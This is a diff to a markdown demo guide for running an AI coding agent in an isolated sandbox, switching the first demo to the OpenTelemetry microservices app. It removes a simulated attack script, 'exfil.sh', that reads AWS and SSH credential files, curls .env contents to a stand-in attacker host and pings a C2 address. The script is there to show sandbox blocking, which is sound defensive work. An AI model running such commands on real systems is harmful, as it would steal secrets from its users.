@@ -130,52 +130,39 @@ The sandbox is invisible to `docker ps`. It's a separate management plane.
 
 ---
 
-## Demo 1: Agent Does Real Work — Safely
+## Demo 1: Agent Works on a Real Microservices App — Safely
 
-**What you're showing:** An agent installs packages, modifies files, runs a server — all inside a sandbox. Your host stays untouched. Then you prove isolation by showing what the agent CAN'T see.
+**What you're showing:** An agent explores, builds, and fixes a complex microservices app (OpenTelemetry Astronomy Shop) — all inside a sandbox. Your host stays untouched. Then you prove isolation.
 
-### Pre-demo setup
+### The demo app: OpenTelemetry Demo
 
-```bash
-# Create a demo project (or use any existing Node/Python project)
-mkdir ~/demo-app && cd ~/demo-app
-git init
-npm init -y
-cat > server.js << 'EOF'
-const express = require('express');
-const app = express();
-app.get('/', (req, res) => res.json({ status: 'running' }));
-app.listen(3000, () => console.log('Server on :3000'));
-EOF
+This repo includes `opentelemetry-demo/` — the official [OpenTelemetry Astronomy Shop](https://github.com/open-telemetry/opentelemetry-demo). A microservice-based e-commerce system with 10+ services in Go, Python, TypeScript, .NET, and more. Docker Compose, Kafka, PostgreSQL, Redis, Prometheus, Grafana, Jaeger — the works.
 
-# Add a fake .env to show credential isolation
-cat > .env << 'EOF'
-DATABASE_URL=postgresql://admin:supersecret@prod-db.internal:5432/main
-AWS_SECRET_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
-STRIPE_KEY=sk_live_1234567890abcdef
-EOF
-
-git add -A && git commit -m "initial"
-```
+This is exactly the kind of complex project where an agent needs real autonomy: installing dependencies, building containers, running services, modifying code across multiple languages.
 
 ### Flow
 
 **Step 1 — Launch the sandbox**
 
 ```bash
+cd opentelemetry-demo
 sbx run claude
 ```
 
 > *Note: First run pulls the image (~1 min). After that it's seconds.*
-> Point out: agent boots in YOLO mode — no permission prompts. It says "full autonomous mode."
+> Point out: agent boots in YOLO mode — no permission prompts.
 
 **Step 2 — Give the agent a real task**
 
 ```
-> Add express, a health check endpoint at /health, and rate limiting using express-rate-limit. Install dependencies, wire it up, and start the server to verify it works.
+Explore this codebase and give me:
+1. A summary of the architecture and tech stack
+2. How to run it locally using Docker Compose
+3. Start the full stack with `docker compose up`
+4. Once healthy, confirm the frontend is accessible at localhost:8080
 ```
 
-> *Note: The agent will `npm install`, create/modify files, and run `node server.js`. Let it work uninterrupted — that's the point. No babysitting.*
+> *Note: The agent will read compose files, understand the architecture, run `docker compose up --build`, and verify services. It's building containers, pulling images, starting Kafka/Postgres/Redis — all inside the sandbox's private Docker daemon. Let it work uninterrupted.*
 
 **Step 3 — While agent works, open a second terminal and prove isolation**
 
@@ -186,7 +173,7 @@ docker ps
 
 # List sandboxes (separate management plane)
 sbx ls
-# → claude-demo-app   RUNNING
+# → Shows sandbox RUNNING
 
 # Check what the agent can see vs your host
 # On your HOST:
@@ -194,11 +181,16 @@ ls ~/.aws ~/.ssh ~/.docker 2>/dev/null
 # → Your credentials, SSH keys, Docker config — all here
 
 # Now shell INTO the sandbox:
-sbx exec claude-demo-app -- bash -c "ls ~/.aws ~/.ssh ~/.docker 2>&1"
+sbx exec <sandbox-name> -- bash -c "ls ~/.aws ~/.ssh ~/.docker 2>&1"
 # → "No such file or directory" for ALL of them
+
+# Agent has its own Docker daemon — check from inside:
+sbx exec <sandbox-name> -- docker ps
+# → 10+ running containers (frontend, cart, checkout, etc.)
+# But YOUR host docker ps shows nothing.
 ```
 
-> *Note: This is the money shot. Side-by-side — host has everything, sandbox has nothing except the project.*
+> *Note: This is the money shot. The agent is running a full microservices platform with Kafka, Postgres, Redis — but your host Docker is completely empty. Two separate worlds.*
 
 **Step 4 — Check network audit**
 
@@ -206,22 +198,23 @@ sbx exec claude-demo-app -- bash -c "ls ~/.aws ~/.ssh ~/.docker 2>&1"
 sbx policy log
 ```
 
-> *Note: Show the allowed list (npm registry, anthropic API) and point out there are NO denied requests because the agent only did legitimate things. Clean bill of health.*
+> *Note: Show the allowed list (Docker Hub registry, anthropic API) and point out there are NO denied requests because the agent only did legitimate things. Clean bill of health.*
 
 **Step 5 — Forward port and show the running app**
 
 ```bash
-sbx ports publish claude-demo-app 3000
-# Open http://localhost:3000/health in browser
+sbx ports <sandbox-name> --publish 8080:8080
+# Open http://localhost:8080 — the Astronomy Shop frontend
 ```
 
-> *Note: App runs inside the sandbox but you can view it from your host by forwarding the port. Agent can start servers, you selectively expose what you need.*
+> *Note: A full e-commerce site with product catalog, cart, checkout — all running inside the sandbox. Port forward lets you see it from your browser.*
 
 **Step 6 — Cleanup**
 
 ```bash
-sbx rm claude-demo-app
-# Sandbox gone. Code stays in your project directory.
+sbx rm <sandbox-name>
+# Sandbox gone. All containers, images, volumes inside it — destroyed.
+# Your host Docker remains untouched.
 ```
 
 ---
@@ -230,32 +223,7 @@ sbx rm claude-demo-app
 
 **What you're showing:** A malicious script tries to exfiltrate data and scan your network. On a bare host it succeeds. In the sandbox it's blocked at every layer. The audit log catches everything.
 
-### Pre-demo setup
-
-```bash
-# Create a "malicious" script in your demo project
-cat > exfil.sh << 'EOF'
-#!/bin/bash
-echo "=== SIMULATED ATTACK ==="
-
-echo "[1] Reading host credentials..."
-cat ~/.aws/credentials 2>&1
-cat ~/.ssh/id_rsa 2>&1
-
-echo "[2] Exfiltrating .env to external server..."
-curl -s -X POST https://evil-server.attacker.com/collect \
-  -d "$(cat .env)" 2>&1
-
-echo "[3] Pinging C2 server..."
-ping -c 3 198.51.100.1 2>&1
-
-echo "[4] Scanning internal network..."
-curl -s http://192.168.1.1:8080 2>&1
-
-echo "=== ATTACK COMPLETE ==="
-EOF
-chmod +x exfil.sh
-```
+The `exfil.sh` script is included in the repo — it simulates credential theft, data exfiltration, C2 callbacks, and internal network scanning.
 
 ### Flow
 
